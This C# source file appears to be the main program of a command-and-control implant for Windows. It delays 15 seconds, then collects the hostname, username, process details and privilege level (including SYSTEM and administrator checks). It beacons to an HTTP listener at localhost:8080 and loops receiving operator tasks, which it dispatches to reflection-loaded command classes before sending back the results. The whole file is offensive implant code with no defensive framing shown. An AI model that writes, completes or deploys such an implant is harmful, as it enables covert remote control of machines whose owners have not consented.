using AgentClient.Application.Commands;
using AgentClient.Domain.Models.Agents;
using AgentClient.Infrastructure.CommModules;
using System.Diagnostics;
using System.Reflection;
using System.Security.Principal;

namespace AgentClient
{
    public class Program
    {
        // TODO: single agent instance across app
        private static Agent _agent;
        private static AgentMetadata _metadata;
        private static CommModule _commModule;
        private static CancellationTokenSource _tokenSource;

        private static List<AgentCommand> _commands = new();
        
        static void Main(string[] args)
        {
            Thread.Sleep(15000);

            GenerateMetadata();
            LoadAgentCommands();

            _agent = new Agent(_metadata);

            _commModule = new HttpCommModule("http://localhost", 8080, _agent);
            _commModule.Initialiser(_metadata);
            _commModule.Start();

            _tokenSource = new CancellationTokenSource();

            while (!_tokenSource.IsCancellationRequested)
            {
                if (_commModule.ReceiveData(out var tasks))
                {
                    // action
                    HandleTasks(tasks);
                }
            }
        }

        private static void HandleTasks(IEnumerable<AgentTask> tasks)
        {
            foreach (var task in tasks)
            {
                HandleTask(task);
            }
        }

        private static void HandleTask(AgentTask task)
        {
            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));
            
            if (command == null)
            {
                SendTaskResult(task.Id, "Invalid Command");
                return;
            }

            var result = command.Execute(task);
            SendTaskResult(task.Id, result);
        }

        private static void SendTaskResult(Guid taskId, string result)
        {
            var taskResult = new AgentTaskResult
            {
                Id = taskId,
                Result = result
            };

            _commModule.SendData(taskResult);
        }

        public static Task Stop()
        {
            return Task.FromCanceled(_tokenSource.Token);
        }

        private static void LoadAgentCommands()
        {
            var self = Assembly.GetExecutingAssembly();

            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(AgentCommand)))
                {
                    var instance = (AgentCommand)Activator.CreateInstance(type);
                    _commands.Add(instance);
                }
            }
        }

        static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);

            var integrity = "Medium";

            if (identity.IsSystem)
            {
                integrity = "SYSTEM";
            }

            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = "High";
            }


            _metadata = new AgentMetadata
            {
                Hostname = Environment.MachineName,
                Username = identity.Name,
                ProcessId = process.Id,
                ProcessName = process.ProcessName,
                Integrity = integrity,
                Architecture = IntPtr.Size == 8 ? "x64" : "x32"
            };

            process.Dispose();
            identity.Dispose();

        }
    }
}
